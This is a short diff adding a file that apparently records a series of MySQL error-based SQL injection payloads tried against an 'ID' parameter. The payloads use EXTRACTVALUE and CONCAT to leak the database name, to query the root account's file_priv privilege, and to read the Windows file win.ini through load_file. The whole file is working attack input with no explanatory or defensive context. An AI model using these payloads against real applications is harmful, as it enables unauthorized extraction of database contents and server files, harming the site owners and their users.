@@ -1,0 +1,13 @@
+ID:'
+ID:' select 1,1,1  
+ID:' select 1,1,1 \-\- 
+ID:1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database()))) AND '1'='1
+ID:1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database()))) 
+ID:1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database()))) AND '1'='1
+ID:1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))'
+ID:1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()))) and '1'=1'
+ID:1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()))) and '1'=1
+ID:1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()))) and '1'='1
+ID:1' AND EXTRACTVALUE(1,CONCAT(0x7e,(select file_priv from mysql.user where user='root'))) and '1'='1
+ID:1' AND EXTRACTVALUE(1,CONCAT(0x7e,(select file_priv from mysql.user where user='root' limit 0,1))) and '1'='1
+ID:1' AND EXTRACTVALUE(1,CONCAT(0x7e,(load_file('C:\\Windows\\win.ini')))) and '1'='1
